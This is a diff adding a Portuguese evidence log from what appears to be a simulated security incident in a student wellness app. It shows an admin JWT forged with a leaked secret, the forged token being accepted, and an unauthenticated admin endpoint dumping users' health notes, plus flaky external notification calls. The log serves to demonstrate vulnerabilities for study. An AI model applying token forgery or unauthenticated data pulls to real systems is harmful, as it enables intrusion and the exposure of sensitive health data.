@@ -1,0 +1,34 @@
+== Incidente simulado WellMe (V1 -> V3 -> V2) ==
+Sun Jun 14 22:15:24 -03 2026
+
+[1] Login legitimo (Estudante FIAP) e captura de token:
+{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI3YzkwMjY1Yy0xNWU0LTQyYzMtODVkNi0xODdjYTM3YjA4MjkiLCJuYW1lIjoiRXN0dWRhbnRlIEZJQVAiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4NjEyNSwiZXhwIjoxNzgxNDg5NzI1fQ.uaW6NqCFd0WZUFCI0hJDdogYVbIUe2HaL2E2NOjjeNM","secret_source":"hardcoded-fallback"}
+HTTP 200
+
+
+[2] (V1) Forja de token ADMIN com o secret vazado (.env.leaked):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlci0wMDAxIiwibmFtZSI6IkF0YWNhbnRlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgxNDg2MTI1LCJleHAiOjE3ODE0ODk3MjV9.xhH8bve5N4xC-u6pQ1ph6dEwdObtpYypCj8MxD8PoxU
+
+[3] (V1) Token forjado aceito na rota protegida /auth/me:
+{"user":{"sub":"attacker-0001","name":"Atacante","role":"admin","iat":1781486125,"exp":1781489725},"note":"token aceito — se for forjado, evidencia o impacto do vazamento V1"}
+HTTP 200
+
+
+[4] (V3) Exfiltracao: GET /admin/users SEM autenticacao retorna todos os usuarios + dados sensiveis:
+[{"id":"806e0b78-0707-4bff-9240-d227aca2ff13","name":"Admin Care","heroCode":"ADMIN-9X7Q","xp":9999,"level":50,"streak":120,"lastCompletedDate":null,"completedDates":[],"role":"admin","healthNotes":"Conta administrativa do servico Care Plus.","createdAt":"2026-06-15T00:53:51.403Z"},{"id":"7c90265c-15e4-42c3-85d6-187ca37b0829","name":"Estudante FIAP","heroCode":"FIAP2025","xp":320,"level":4,"streak":7,"lastCompletedDate":"2026-06-13","completedDates":["2026-06-09","2026-06-10","2026-06-13"],"role":"user","healthNotes":"Pre-diabetico; acompanhamento nutricional semanal.","createdAt":"2026-06-15T00:53:51.403Z"},{"id":"b2e2c5e9-4d6c-4216-a4d3-e26dcd7c2dd2","name":"Marina Souza","heroCode":"MAR-2231","xp":540,"level":6,"streak":14,"lastCompletedDate":null,"completedDates":[],"role":"user","healthNotes":"Quadro de ansiedade; usa missoes de respiracao; alergia a penicilina.","createdAt":"2026-06-15T00:53:51.403Z"},{"id":"85054a90-1134-4b92-931c-901ae8183eda","name":"Carlos Lima","heroCode":"CAR-8842","xp":110,"level":2,"streak":1,"lastCompletedDate":null,"completedDates":[],"role":"user","healthNotes":"Hipertensao controlada; IMC 28.","createdAt":"2026-06-15T00:53:51.403Z"},{"id":"d0f39242-a929-40a0-976e-26716ef36c78","name":"Bia Nunes","heroCode":"BIA-0099","xp":760,"level":8,"streak":30,"lastCompletedDate":null,"completedDates":[],"role":"user","healthNotes":"Gestante (2o trimestre); monitorando sono e hidratacao.","createdAt":"2026-06-15T00:53:51.403Z"}]
+HTTP 200
+
+
+[5] (V2) Instabilidade por dependencia externa (notify) — mesma credencial CORRETA, 10 tentativas (200=ok / 500=falha ao notificar):
+tentativa 1 -> HTTP 200
+tentativa 2 -> HTTP 500
+tentativa 3 -> HTTP 500
+tentativa 4 -> HTTP 200
+tentativa 5 -> HTTP 200
+tentativa 6 -> HTTP 500
+tentativa 7 -> HTTP 500
+tentativa 8 -> HTTP 200
+tentativa 9 -> HTTP 200
+tentativa 10 -> HTTP 200
+
+[OK] Evidencias salvas em evidencias/incident-output.txt e eventos em logs/app.log
